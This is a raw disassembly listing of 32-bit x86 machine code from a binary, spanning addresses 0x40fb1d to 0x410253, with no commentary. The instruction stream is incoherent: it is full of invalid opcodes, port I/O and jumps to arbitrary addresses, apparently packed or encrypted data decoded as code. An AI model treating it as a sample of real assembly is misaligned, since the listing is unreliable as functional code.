  40fb1d:	adc    BYTE PTR [edi],al
  40fb1f:	aas    
  40fb20:	push   es
  40fb21:	push   ss
  40fb22:	xor    al,0xc
  40fb24:	push   0xfffffff1
  40fb26:	push   eax
  40fb27:	scas   eax,DWORD PTR es:[edi]
  40fb28:	std    
  40fb29:	inc    ebp
  40fb2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb2b:	and    BYTE PTR [ebp-0x264239fc],0x86
  40fb32:	je     0x40faea
  40fb34:	adc    eax,0x746cafe4
  40fb39:	in     eax,0x9c
  40fb3b:	sbb    ch,BYTE PTR [edx]
  40fb3d:	xor    esi,eax
  40fb3f:	xlat   BYTE PTR ds:[ebx]
  40fb40:	dec    eax
  40fb41:	xlat   BYTE PTR ds:[ebx]
  40fb42:	cwde   
  40fb43:	cwde   
  40fb44:	into   
  40fb45:	and    al,0xa7
  40fb47:	or     bh,BYTE PTR [edi-0xf4a394a]
  40fb4d:	xor    DWORD PTR [edi-0x1d],edi
  40fb50:	pop    ebp
  40fb51:	inc    esi
  40fb52:	mov    ch,0xbf
  40fb54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb55:	cmp    dh,dh
  40fb57:	mov    esi,ebp
  40fb59:	imul   edx,DWORD PTR [esi-0x2ebe1d7b],0xffffffee
  40fb60:	dec    ecx
  40fb61:	adc    eax,0x82a147c9
  40fb66:	mov    esi,DWORD PTR [edi-0x5ddc77e4]
  40fb6c:	das    
  40fb6d:	push   ebp
  40fb6e:	bound  esi,QWORD PTR [ebx-0x70]
  40fb71:	outs   dx,DWORD PTR ds:[esi]
  40fb72:	adc    bh,bl
  40fb74:	xlat   BYTE PTR ds:[ebx]
  40fb75:	dec    ecx
  40fb76:	aam    0xcb
  40fb78:	pop    ds
  40fb79:	jno    0x40fb8c
  40fb7b:	(bad)  
  40fb7d:	and    BYTE PTR [eax+0x67],dl
  40fb80:	je     0x40fbe7
  40fb82:	and    esi,DWORD PTR [esi+ecx*8]
  40fb85:	int3   
  40fb86:	mov    esi,ecx
  40fb88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb89:	mov    ah,0x18
  40fb8b:	pop    edi
  40fb8c:	pop    edx
  40fb8d:	ret    
  40fb8e:	(bad)  
  40fb8f:	xchg   ecx,eax
  40fb90:	popa   
  40fb91:	mov    dh,0x6f
  40fb93:	div    DWORD PTR [edi]
  40fb95:	call   0x5e66c5f8
  40fb9a:	mov    ecx,0x34020864
  40fb9f:	mov    edi,0x1d399bb0
  40fba4:	pop    ebp
  40fba5:	ret    0x1089
  40fba8:	sbb    DWORD PTR [ebx],esp
  40fbaa:	(bad)  
  40fbab:	push   edx
  40fbac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbad:	stc    
  40fbae:	data16 scas al,BYTE PTR es:[edi]
  40fbb0:	jecxz  0x40fb98
  40fbb2:	dec    edi
  40fbb3:	out    dx,al
  40fbb4:	shl    BYTE PTR [ebp+0xc],cl
  40fbb7:	mov    ah,0xc9
  40fbb9:	rcr    edi,cl
  40fbbb:	in     al,0xe3
  40fbbd:	repnz pop es
  40fbbf:	(bad)  
  40fbc0:	dec    BYTE PTR [ecx+0xd]
  40fbc3:	ficom  WORD PTR [edx]
  40fbc5:	in     eax,0xcc
  40fbc7:	mov    al,ds:0x62889638
  40fbcc:	mov    ds:0x99601f4a,al
  40fbd1:	sbb    edx,esi
  40fbd3:	push   0xffffffe2
  40fbd5:	mov    eax,0xce96bf52
  40fbda:	ror    DWORD PTR [edi],0xd7
  40fbdd:	push   eax
  40fbde:	sub    DWORD PTR [ecx+eax*2-0x49],0xd4249521
  40fbe6:	mov    edx,0x18800f4d
  40fbeb:	dec    ecx
  40fbec:	ins    BYTE PTR es:[edi],dx
  40fbed:	test   eax,0x15db3b35
  40fbf2:	clc    
  40fbf3:	lea    esp,[edi-0x7c]
  40fbf6:	inc    eax
  40fbf7:	lods   eax,DWORD PTR ds:[esi]
  40fbf8:	scas   eax,DWORD PTR es:[di]
  40fbfa:	sub    eax,0x1158df45
  40fbff:	sbb    dh,BYTE PTR [esi-0x6b79154c]
  40fc05:	xlat   BYTE PTR ds:[ebx]
  40fc06:	mov    eax,gs:0x78c79207
  40fc0c:	out    dx,al
  40fc0d:	cmp    al,0x75
  40fc0f:	add    dh,bh
  40fc11:	ja     0x40fc0c
  40fc13:	mov    ebx,0x496c82b6
  40fc18:	retfw  
  40fc1a:	ss je  0x40fbc0
  40fc1d:	test   DWORD PTR [esi+0x35a625c6],0xa55b8408
  40fc27:	and    BYTE PTR [ebp+0x0],0xdb
  40fc2b:	jecxz  0x40fc89
  40fc2d:	pop    ds
  40fc2e:	jg     0x40fc0f
  40fc30:	xchg   ecx,eax
  40fc31:	mov    eax,0x37ff19dd
  40fc36:	aaa    
  40fc37:	xor    al,BYTE PTR [esi+0x65c084fa]
  40fc3d:	cli    
  40fc3e:	or     ebp,DWORD PTR [ebx]
  40fc40:	push   ecx
  40fc41:	into   
  40fc42:	lods   eax,DWORD PTR ds:[esi]
  40fc43:	leave  
  40fc44:	dec    eax
  40fc45:	sbb    edx,DWORD PTR [ebx+0x51]
  40fc48:	inc    ebx
  40fc49:	addr16 cld 
  40fc4b:	xor    DWORD PTR [eax+edx*4],edi
  40fc4e:	jg     0x40fc66
  40fc50:	lds    ecx,FWORD PTR [edx-0x63ff87a]
  40fc56:	mov    edi,0x61b0bfa8
  40fc5b:	xchg   edx,eax
  40fc5c:	add    BYTE PTR [esi+0x5a82cd90],bl
  40fc62:	(bad)  
  40fc63:	adc    eax,0xea98510d
  40fc68:	mov    ds:0x911ab302,eax
  40fc6d:	inc    ecx
  40fc6e:	xor    dl,BYTE PTR [ecx+0x5de8f789]
  40fc74:	int3   
  40fc75:	loop   0x40fc14
  40fc77:	dec    ecx
  40fc78:	mov    eax,ds:0xcf0a8325
  40fc7d:	fwait
  40fc7e:	sub    al,0xe3
  40fc80:	adc    eax,0xb99ac6cc
  40fc85:	call   0x9b52806b
  40fc8a:	stos   BYTE PTR es:[edi],al
  40fc8b:	nop
  40fc8c:	cmp    esp,esi
  40fc8e:	test   eax,0xbb3223c9
  40fc93:	push   0xffffffa5
  40fc95:	not    bl
  40fc97:	stos   DWORD PTR es:[edi],eax
  40fc98:	jbe    0x40fc70
  40fc9a:	push   esi
  40fc9b:	push   ecx
  40fc9c:	popf   
  40fc9d:	retf   0x7bd1
  40fca0:	je     0x40fcf3
  40fca2:	jle    0x40fc92
  40fca4:	ja     0x40fcfe
  40fca6:	in     al,0x43
  40fca8:	fidivr WORD PTR [ebx+0x4fbc96f3]
  40fcaf:	scas   eax,DWORD PTR es:[edi]
  40fcb0:	sub    dl,BYTE PTR [eax+ebx*1]
  40fcb3:	adc    DWORD PTR [ebp+0x3e],ebx
  40fcb6:	jae    0x40fc75
  40fcb8:	stos   DWORD PTR es:[edi],eax
  40fcb9:	push   0x5975643f
  40fcbe:	or     ah,al
  40fcc0:	mov    bh,BYTE PTR [esi-0x669887d3]
  40fcc6:	icebp  
  40fcc7:	rcl    DWORD PTR [ebp-0x45ca82ea],1
  40fccd:	adc    al,0xcb
  40fccf:	rol    DWORD PTR [ebp+0x3e7debf7],0x43
  40fcd6:	xchg   esp,eax
  40fcd7:	aad    0x66
  40fcd9:	xor    DWORD PTR [eax-0x2060bb63],edi
  40fcdf:	ja     0x40fd04
  40fce1:	scas   al,BYTE PTR es:[edi]
  40fce2:	lea    edi,[ebx+eiz*1+0x74b0e450]
  40fce9:	(bad)  [ebp-0x1a6986a9]
  40fcef:	retf   0x548b
  40fcf2:	or     DWORD PTR [eax+0x6],ebx
  40fcf5:	cmp    edx,esp
  40fcf7:	xor    dh,BYTE PTR [ebx-0x77dffa11]
  40fcfd:	add    BYTE PTR [edi-0x30089eec],bh
  40fd03:	pushf  
  40fd04:	xor    bl,BYTE PTR [edx-0x45272f30]
  40fd0a:	retf   
  40fd0b:	mov    ds:0xdb5b03e8,al
  40fd10:	daa    
  40fd11:	dec    esi
  40fd12:	outs   dx,DWORD PTR ds:[esi]
  40fd13:	push   ds
  40fd14:	push   ds
  40fd15:	sbb    DWORD PTR [edi+0x3b],esi
  40fd18:	imul   eax,esi,0x842d727c
  40fd1e:	dec    ebx
  40fd1f:	xor    ch,BYTE PTR [esi+edi*8+0x55]
  40fd23:	test   DWORD PTR [edi],ebp
  40fd25:	dec    edi
  40fd26:	jmp    0xdffb032a
  40fd2b:	outs   dx,BYTE PTR ds:[esi]
  40fd2c:	neg    dl
  40fd2e:	call   FWORD PTR [ebp+0x7e]
  40fd31:	fstp   QWORD PTR [esi]
  40fd33:	jg     0x40fcd7
  40fd35:	retf   0x7992
  40fd38:	xchg   DWORD PTR [eax-0x69],edx
  40fd3b:	ins    DWORD PTR es:[edi],dx
  40fd3c:	clc    
  40fd3d:	enterw 0x5ad7,0xbc
  40fd42:	out    dx,al
  40fd43:	pop    ebp
  40fd44:	add    dh,ah
  40fd46:	lds    edx,FWORD PTR gs:[ecx+edx*2]
  40fd4a:	mov    ecx,0x6c4adb9a
  40fd4f:	sbb    eax,0x43b9d3e0
  40fd54:	adc    BYTE PTR [esi-0x9],ch
  40fd57:	mov    edx,0xd9bdfedd
  40fd5c:	inc    ecx
  40fd5d:	xor    al,0xd3
  40fd5f:	adc    eax,0x5d9edadd
  40fd64:	mov    eax,DWORD PTR [ebp-0x13]
  40fd67:	sbb    ebx,DWORD PTR [eax-0x2b]
  40fd6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd6b:	mov    eax,0x655602
  40fd70:	inc    ecx
  40fd71:	mov    dl,0x74
  40fd73:	mov    edx,0x211c25e8
  40fd78:	xchg   edx,eax
  40fd79:	aam    0x36
  40fd7b:	in     eax,0x9e
  40fd7d:	nop
  40fd7e:	cmp    DWORD PTR [ecx+0x67edd07e],ecx
  40fd84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd85:	or     eax,0xbcf5eb60
  40fd8a:	dec    eax
  40fd8b:	aas    
  40fd8c:	adc    eax,0xbfee6f22
  40fd91:	fiadd  DWORD PTR [edi+0x458e9629]
  40fd97:	pushf  
  40fd98:	imul   ecx,DWORD PTR [ebx],0xffffff94
  40fd9b:	nop
  40fd9c:	add    DWORD PTR [ecx],edx
  40fd9e:	inc    ecx
  40fd9f:	in     eax,dx
  40fda0:	outs   dx,BYTE PTR ds:[esi]
  40fda1:	add    al,0xa1
  40fda3:	xor    bl,BYTE PTR [eax+0x18]
  40fda6:	leave  
  40fda7:	stc    
  40fda8:	cmp    eax,0x403a7613
  40fdad:	add    al,0xdc
  40fdaf:	jge    0x40fd6e
  40fdb1:	mov    eax,ds:0x4c627aa7
  40fdb6:	test   DWORD PTR es:[ecx+0x63edd757],edx
  40fdbd:	lahf   
  40fdbe:	lahf   
  40fdbf:	popa   
  40fdc0:	call   0xb30b:0x6b4d6c32
  40fdc7:	stos   BYTE PTR es:[edi],al
  40fdc8:	push   0x65
  40fdca:	xchg   ebp,eax
  40fdcb:	push   ds
  40fdcc:	xlat   BYTE PTR ds:[ebx]
  40fdcd:	pop    eax
  40fdce:	xchg   esp,eax
  40fdcf:	js     0x40fd6a
  40fdd1:	popf   
  40fdd2:	pop    ds
  40fdd3:	lods   eax,DWORD PTR ds:[esi]
  40fdd4:	nop
  40fdd5:	aam    0x6c
  40fdd7:	(bad)  
  40fdd8:	repz pushf 
  40fdda:	sbb    eax,0x2e3de2e4
  40fddf:	imul   eax,ebp,0x307e4997
  40fde5:	outs   dx,BYTE PTR ds:[esi]
  40fde6:	sti    
  40fde7:	jnp    0x40fdda
  40fde9:	push   ecx
  40fdea:	cmp    BYTE PTR [eax+0x3e],al
  40fded:	pop    esi
  40fdee:	and    eax,0x30596100
  40fdf3:	mov    ebx,0x652a0470
  40fdf8:	and    eax,0x75c88b47
  40fdfd:	out    dx,eax
  40fdfe:	std    
  40fdff:	bound  eax,QWORD PTR [eax-0x592dd0ea]
  40fe05:	out    0xd3,eax
  40fe07:	hlt    
  40fe08:	inc    ecx
  40fe09:	dec    esp
  40fe0a:	aad    0x54
  40fe0c:	shl    DWORD PTR [edx-0x34d96cec],cl
  40fe12:	pop    ebp
  40fe13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe14:	out    dx,eax
  40fe15:	jae    0x40fdc5
  40fe17:	jle    0x40fdb7
  40fe19:	sub    DWORD PTR [eax+0x4187b8f5],0x767c3e1c
  40fe23:	add    al,0x83
  40fe25:	jns    0x40fe05
  40fe27:	das    
  40fe28:	pop    ebx
  40fe29:	(bad)
  40fe2c:	(bad)  
  40fe2d:	push   edi
  40fe2e:	pop    ss
  40fe2f:	inc    ebp
  40fe31:	cmc    
  40fe32:	mov    edx,0xa5f3e4d3
  40fe37:	(bad)  
  40fe38:	nop
  40fe39:	out    0x16,al
  40fe3b:	cwde   
  40fe3c:	pop    esi
  40fe3d:	xchg   edx,eax
  40fe3e:	or     al,0x72
  40fe40:	(bad)  
  40fe41:	sub    BYTE PTR [edx+0x59],cl
  40fe44:	fist   DWORD PTR [ebx+0x26]
  40fe47:	mov    BYTE PTR ds:0xb15ab689,al
  40fe4d:	mov    edi,esp
  40fe4f:	scas   al,BYTE PTR es:[edi]
  40fe50:	icebp  
  40fe51:	jmp    esi
  40fe53:	and    bl,dh
  40fe55:	mov    al,ds:0x1a1b7f69
  40fe5a:	jne    0x40fe30
  40fe5c:	ret    
  40fe5d:	sbb    esi,ebx
  40fe5f:	fsubp  st(2),st
  40fe61:	pop    ds
  40fe62:	arpl   WORD PTR [esi-0x762f00a0],cx
  40fe68:	sbb    al,0x2d
  40fe6a:	dec    edx
  40fe6b:	mov    al,ds:0xbfa2d7cb
  40fe70:	push   edi
  40fe71:	into   
  40fe72:	xchg   esi,eax
  40fe73:	mov    esi,0x87558d0
  40fe78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe79:	repz jecxz 0x40feee
  40fe7c:	jge    0x40fe35
  40fe7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe7f:	mov    eax,ds:0x7c4fc86e
  40fe84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe85:	cmp    bl,BYTE PTR [esi]
  40fe87:	xchg   edx,eax
  40fe88:	pop    ebp
  40fe89:	sub    BYTE PTR [ebp-0x43],dl
  40fe8c:	hlt    
  40fe8d:	lahf   
  40fe8e:	mov    gs,WORD PTR [ebp-0x24]
  40fe91:	jl     0x40fe6f
  40fe93:	inc    esi
  40fe95:	mov    ecx,eax
  40fe97:	les    eax,FWORD PTR [ebx+0x54]
  40fe9a:	sti    
  40fe9b:	push   ss
  40fe9c:	fisubr DWORD PTR [eax-0x2f02c86a]
  40fea2:	mov    cl,0x96
  40fea4:	cmp    al,0xae
  40fea6:	cmp    edx,DWORD PTR [edx]
  40fea8:	mov    al,0xb4
  40feaa:	rol    edx,1
  40feac:	dec    edx
  40fead:	pop    esi
  40feae:	xchg   esi,eax
  40feaf:	mov    ebp,0xf579dbbd
  40feb4:	mov    dl,0x66
  40feb6:	push   0xffffffa0
  40feb8:	xchg   edx,eax
  40feb9:	in     al,0x1c
  40febb:	or     DWORD PTR [eax+ecx*4-0x5b],edx
  40febf:	mov    ebp,0x1204d40b
  40fec4:	test   eax,0x89869451
  40fec9:	out    0xf4,eax
  40fecb:	xor    eax,0xb6ce43
  40fed0:	imul   eax,DWORD PTR [eax+0x24],0x21
  40fed4:	lahf   
  40fed5:	(bad)  
  40fed7:	stc    
  40fed8:	dec    eax
  40fed9:	mov    ds:0x6a15a118,eax
  40fede:	adc    ecx,DWORD PTR [edx+0x3b]
  40fee1:	cmp    esi,esp
  40fee3:	pop    esp
  40fee4:	mov    ebx,0x646cc963
  40fee9:	in     eax,0x36
  40feeb:	imul   esi,DWORD PTR [esi-0x13],0x3f
  40feef:	cli    
  40fef0:	mov    ds:0x860fe590,eax
  40fef5:	mov    edi,DWORD PTR [ecx+esi*2+0x7913e0c8]
  40fefc:	mov    ?,WORD PTR [ecx-0x67]
  40feff:	xor    al,0x47
  40ff01:	push   edi
  40ff02:	scas   eax,DWORD PTR es:[edi]
  40ff03:	inc    ebx
  40ff04:	(bad)  
  40ff05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff06:	imul   esi,DWORD PTR [edx+0x57b4bb33],0xffffffc7
  40ff0d:	dec    edx
  40ff0e:	and    al,0xc0
  40ff10:	pop    ebx
  40ff11:	bound  ecx,QWORD PTR [eax]
  40ff13:	xchg   edx,eax
  40ff14:	inc    edx
  40ff15:	xchg   ecx,eax
  40ff16:	or     al,0x1d
  40ff18:	dec    edi
  40ff19:	into   
  40ff1a:	ror    BYTE PTR [esi-0x43],1
  40ff1d:	cmp    al,0xc6
  40ff1f:	(bad)  
  40ff20:	imul   DWORD PTR [ebx+0x2daea32b]
  40ff26:	jae    0x40ff24
  40ff28:	aad    0x98
  40ff2a:	fstp   TBYTE PTR [eax-0x6f68ff41]
  40ff30:	fdivr  DWORD PTR [ebx+0x53]
  40ff33:	fcomp  st(7)
  40ff35:	stos   DWORD PTR es:[edi],eax
  40ff36:	sbb    dl,0x98
  40ff39:	push   esi
  40ff3a:	jbe    0x40feed
  40ff3c:	pop    esp
  40ff3d:	retf   
  40ff3e:	mov    edx,0xefa6e3d0
  40ff43:	(bad)  
  40ff44:	xchg   ebx,eax
  40ff45:	rol    DWORD PTR [esi],cl
  40ff47:	dec    edi
  40ff48:	jo     0x40ff58
  40ff4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff4b:	test   al,0x5e
  40ff4d:	inc    ebx
  40ff4e:	outs   dx,BYTE PTR ds:[esi]
  40ff4f:	les    esp,FWORD PTR [edi+0x5281d1b9]
  40ff55:	xchg   BYTE PTR [ebx+0x1f],ah
  40ff58:	jns    0x40ff10
  40ff5a:	ja     0x40ff85
  40ff5c:	aaa    
  40ff5d:	add    esi,edi
  40ff5f:	bound  edi,QWORD PTR [ebp-0x14]
  40ff62:	fs jnp 0x40ff94
  40ff65:	adc    ebx,edi
  40ff67:	sub    al,0xa5
  40ff69:	stos   BYTE PTR es:[edi],al
  40ff6a:	adc    BYTE PTR [esi+0x2f8840ff],ah
  40ff70:	imul   ecx,DWORD PTR [esi+0x6c88aeb5],0x4f81f7af
  40ff7a:	pop    ecx
  40ff7b:	inc    eax
  40ff7c:	mov    edi,DWORD PTR [edi+0x26ae6ae1]
  40ff82:	mov    ecx,DWORD PTR [edi]
  40ff84:	or     dl,ch
  40ff86:	ins    BYTE PTR es:[edi],dx
  40ff87:	mov    dh,0xb6
  40ff89:	jmp    DWORD PTR [esi-0x1111f9f4]
  40ff8f:	dec    eax
  40ff90:	imul   edx,DWORD PTR [edx+0x1b],0x52abe371
  40ff97:	addr16 mov ds:0xff0c,al
  40ff9b:	lods   eax,DWORD PTR ds:[esi]
  40ff9c:	mov    ds:0x4c8880a8,eax
  40ffa1:	adc    DWORD PTR [edi-0x1862eccf],0xffffffcd
  40ffa8:	fst    QWORD PTR [ebp+0x7a]
  40ffab:	enter  0xad24,0x2c
  40ffaf:	push   ds
  40ffb0:	pop    ebp
  40ffb1:	outs   dx,BYTE PTR ds:[esi]
  40ffb2:	(bad)  
  40ffb3:	loopne 0x40ffe3
  40ffb5:	rcl    DWORD PTR [esi],1
  40ffb7:	out    0xf6,eax
  40ffb9:	test   DWORD PTR [esp+ebp*2-0x105c4e93],esi
  40ffc0:	shl    BYTE PTR [eax-0x4f],0xa1
  40ffc4:	mov    esi,0x7454c1ba
  40ffc9:	test   eax,0x8d6dd095
  40ffce:	fld    st(4)
  40ffd0:	lea    ebp,[ebp+edx*4+0x3d]
  40ffd4:	inc    ebp
  40ffd5:	sahf   
  40ffd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffd7:	sub    eax,0x51745eb0
  40ffdc:	hlt    
  40ffdd:	outs   dx,DWORD PTR ds:[esi]
  40ffde:	mov    eax,ds:0x34535ca6
  40ffe3:	add    DWORD PTR [ecx+0x5b],ebp
  40ffe6:	rcr    ebx,1
  40ffe8:	in     al,0x22
  40ffea:	mov    ah,al
  40ffec:	mov    cl,0xe3
  40ffee:	adc    edi,esp
  40fff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fff1:	push   esi
  40fff2:	pop    edx
  40fff3:	ds push ds
  40fff5:	xchg   ebp,eax
  40fff6:	out    dx,eax
  40fff7:	push   ebp
  40fff8:	xor    esp,DWORD PTR [eax+0x7e]
  40fffb:	adc    DWORD PTR [ebx],0xfe6dffcd
  410001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410002:	aad    0x3
  410004:	cdq    
  410005:	clc    
  410006:	jne    0x40ffd5
  410008:	push   eax
  410009:	pop    esi
  41000a:	push   0x5b4a2244
  41000f:	jl     0x410059
  410011:	xchg   edi,eax
  410013:	mov    ecx,0x26c7aa2
  410018:	arpl   WORD PTR [ebp+0x65],ax
  41001b:	push   esp
  41001c:	push   es
  41001d:	xlat   BYTE PTR ds:[ebx]
  41001e:	and    eax,0x886c6535
  410023:	cmp    ah,dl
  410025:	(bad)  
  410026:	aam    0x9c
  410028:	jae    0x40ffc6
  41002a:	inc    ecx
  41002b:	push   esi
  41002c:	pop    ebx
  41002d:	cli    
  41002e:	inc    edi
  41002f:	daa    
  410030:	mov    bl,0x79
  410032:	adc    bh,ch
  410034:	imul   ebx,DWORD PTR [bp+di-0x6f65],0xffffffbd
  41003a:	mov    eax,ds:0x50998449
  41003f:	test   eax,0x44a0562a
  410044:	xchg   esi,eax
  410045:	mov    dh,0x1d
  410047:	cwde   
  410048:	jns    0x410043
  41004a:	and    bh,cl
  41004c:	outs   dx,BYTE PTR ds:[esi]
  41004d:	add    ecx,edi
  41004f:	(bad)  [edx]
  410051:	xchg   edx,eax
  410052:	push   0xa3e5472a
  410057:	xchg   ebp,eax
  410058:	add    ecx,ecx
  41005a:	jnp    0x410022
  41005c:	push   eax
  41005d:	xchg   esi,eax
  41005e:	xchg   esp,eax
  41005f:	sbb    DWORD PTR [edx],esi
  410061:	das    
  410062:	rcr    BYTE PTR [esi-0x2a],cl
  410065:	int3   
  410066:	jmp    0xd5560783
  41006b:	add    esi,ebp
  41006d:	add    ch,BYTE PTR [ebx-0x2cbc155c]
  410073:	cmp    al,0xcd
  410075:	jg     0x41009d
  410077:	idiv   DWORD PTR [eax+0x3d]
  41007a:	call   0x3421:0x97d716f6
  410081:	fwait
  410082:	test   DWORD PTR [ecx-0x8],esp
  410085:	mov    bl,0x2c
  410087:	push   ds
  410088:	mov    esi,0x1a694ea3
  41008d:	inc    ebx
  41008e:	cli    
  41008f:	out    0xe9,eax
  410091:	adc    al,0xf7
  410093:	mov    esi,0xad93b561
  410098:	cmp    eax,0xf8e074aa
  41009d:	pop    ss
  41009e:	aaa    
  41009f:	or     BYTE PTR ss:[ecx],al
  4100a2:	jecxz  0x4100a5
  4100a4:	aas    
  4100a5:	pop    ebx
  4100a6:	mov    eax,DWORD PTR [ebp+0x5b]
  4100a9:	(bad)  
  4100aa:	(bad)  
  4100ab:	fdiv   QWORD PTR [eax]
  4100ad:	sbb    eax,DWORD PTR [eax-0x42282d8d]
  4100b3:	js     0x4100fe
  4100b5:	jo     0x4100a7
  4100b7:	outs   dx,BYTE PTR ds:[esi]
  4100b8:	test   eax,0xffdca640
  4100bd:	adc    DWORD PTR [ecx+0x13],0xb37c066a
  4100c4:	pop    edx
  4100c5:	mov    dh,0xbf
  4100c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100c8:	inc    ebx
  4100c9:	retf   
  4100ca:	cdq    
  4100cb:	popa   
  4100cc:	nop
  4100cd:	addr16 (bad) 
  4100cf:	ja     0x410125
  4100d1:	mov    bl,0xa
  4100d3:	in     eax,dx
  4100d4:	xor    DWORD PTR [edi-0x7e],ecx
  4100d7:	sub    al,0xcd
  4100d9:	arpl   WORD PTR [eax+0xf2ce3dd],cx
  4100df:	int3   
  4100e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100e1:	jno    0x410072
  4100e3:	dec    ebx
  4100e4:	pop    ecx
  4100e5:	jns    0x410136
  4100e7:	or     eax,0xf69432bb
  4100ec:	cli    
  4100ed:	leave  
  4100ee:	adc    DWORD PTR [esi-0x5],esp
  4100f1:	ret    
  4100f2:	call   0x2daa:0xc223124c
  4100f9:	mov    eax,0x673ad317
  4100fe:	or     BYTE PTR [esi+0x2a],bl
  410101:	(bad)  
  410102:	pop    ecx
  410103:	jbe    0x4100c1
  410105:	and    BYTE PTR [ecx-0x45],ch
  410108:	test   eax,0xea08c3f2
  41010d:	mov    bh,al
  41010f:	or     ebx,edx
  410111:	sub    ah,BYTE PTR [eax-0x15]
  410114:	adc    al,0x1e
  410116:	mov    ecx,0x35a3c5be
  41011b:	int    0x5
  41011d:	jbe    0x410199
  41011f:	add    ah,BYTE PTR [ecx]
  410121:	lds    esp,FWORD PTR [edx]
  410123:	ror    BYTE PTR [eax+0x69],cl
  410126:	xchg   BYTE PTR [ebx+esi*2+0x34],ch
  41012a:	mov    dl,0x3b
  41012c:	xor    cl,BYTE PTR [ebx+0x48]
  41012f:	pusha  
  410130:	add    bl,al
  410132:	and    BYTE PTR [ecx-0x4c0b3a0d],al
  410138:	les    esp,FWORD PTR [ebx-0x17]
  41013b:	pop    edi
  41013c:	add    DWORD PTR [eax],edx
  41013e:	(bad)  
  41013f:	jp     0x410110
  410141:	stc    
  410142:	scas   al,BYTE PTR es:[edi]
  410143:	(bad)  
  410144:	mov    al,0x9e
  410146:	leave  
  410147:	jg     0x4101b1
  410149:	and    eax,esi
  41014b:	ds inc sp
  41014e:	adc    eax,0xda9f6223
  410153:	adc    eax,0x146dddab
  410158:	jb     0x4100dd
  41015a:	xchg   edx,eax
  41015b:	inc    ebx
  41015c:	add    ebx,DWORD PTR [ebx+ecx*4]
  41015f:	sbb    eax,0x2f85b8e2
  410164:	jne    0x4101c0
  410166:	scas   eax,DWORD PTR es:[edi]
  410167:	test   BYTE PTR [edi],0x39
  41016a:	cmp    ch,BYTE PTR [edi+0xab54d33]
  410170:	frstor [edx+esi*1]
  410173:	inc    ecx
  410174:	dec    edx
  410175:	shr    DWORD PTR [esi+edi*4-0x6640b382],0x8b
  41017d:	ins    BYTE PTR es:[edi],dx
  41017e:	or     esi,DWORD PTR [ecx+0x8]
  410181:	sti    
  410182:	push   ds
  410183:	sbb    edx,DWORD PTR [eax]
  410185:	sub    al,0x94
  410187:	add    edi,DWORD PTR [edx]
  410189:	xor    eax,0x558dc389
  41018e:	cwde   
  41018f:	nop
  410190:	sbb    ah,BYTE PTR [eax-0x2f]
  410193:	rcl    DWORD PTR [edi-0x23],1
  410196:	jle    0x410171
  410198:	fdiv   DWORD PTR [edi+eax*8]
  41019b:	leave  
  41019c:	(bad)  
  41019d:	popa   
  41019e:	loop   0x4101b4
  4101a0:	jne    0x41015f
  4101a2:	scas   al,BYTE PTR es:[edi]
  4101a3:	iret   
  4101a4:	arpl   WORD PTR [edx+0x43],dx
  4101a7:	aad    0x75
  4101a9:	xchg   ebp,eax
  4101aa:	das    
  4101ab:	jp     0x4101d0
  4101ad:	test   BYTE PTR ds:0x4ce28d31,bh
  4101b3:	call   0xa6e601b8
  4101b8:	mov    ds:0x24e31db7,al
  4101bd:	out    0xcf,eax
  4101bf:	cmp    edx,DWORD PTR [esi]
  4101c1:	imul   esi,DWORD PTR [edx+0x61],0xffffffa5
  4101c5:	xchg   edi,eax
  4101c6:	dec    esp
  4101c7:	retf   0x6844
  4101ca:	scas   eax,DWORD PTR es:[edi]
  4101cb:	xchg   ebp,eax
  4101cc:	pop    ebx
  4101cd:	xor    edi,ebp
  4101cf:	jmp    0x5cefbbc
  4101d4:	ins    DWORD PTR es:[edi],dx
  4101d5:	mov    ds:0x5003c56e,al
  4101da:	ret    0x286f
  4101dd:	dec    ch
  4101df:	dec    BYTE PTR [esi+0x9]
  4101e2:	sahf   
  4101e3:	adc    eax,0x792571c1
  4101e8:	pop    eax
  4101e9:	cld    
  4101ea:	xchg   esp,eax
  4101eb:	mov    cl,0x7d
  4101ed:	dec    DWORD PTR [edi-0x4a]
  4101f0:	cmp    DWORD PTR [ecx-0x4c180a4a],0xfffffff9
  4101f7:	xor    eax,0xe7c3912d
  4101fc:	fnstcw WORD PTR [edx+0x73]
  4101ff:	cmp    al,0xb0
  410201:	push   esi
  410202:	ja     0x41022d
  410204:	add    edx,DWORD PTR [edi-0x66]
  410207:	jo     0x410217
  410209:	pop    edx
  41020a:	call   0x59df3967
  41020f:	call   0x2950579
  410214:	in     al,dx
  410215:	adc    DWORD PTR [edx],eax
  410217:	push   edi
  410218:	sbb    al,BYTE PTR [edx-0x52]
  41021b:	cmp    al,0x76
  41021d:	cwde   
  41021e:	int    0xff
  410220:	inc    ebp
  410221:	sub    edx,DWORD PTR [edx]
  410223:	jg     0x41025d
  410225:	mov    ebp,0x863987b
  41022a:	jo     0x4101dc
  41022c:	mov    dl,0xf3
  41022e:	pop    ecx
  41022f:	and    DWORD PTR [ecx],esp
  410231:	mov    gs,WORD PTR [ebp*1+0x58b44769]
  410238:	(bad)  
  410239:	push   edi
  41023a:	cmp    dh,BYTE PTR [ecx+0x10]
  41023d:	enter  0x4d76,0x26
  410241:	sub    al,0x88
  410243:	cmp    eax,0x69bfc92
  410248:	fwait
  410249:	lods   eax,DWORD PTR ds:[esi]
  41024a:	adc    eax,0x251dc76c
  41024f:	into   
  410250:	xchg   ebx,eax
  410251:	aas    
  410252:	outs   dx,BYTE PTR ds:[esi]
  410253:	add    al,0xed
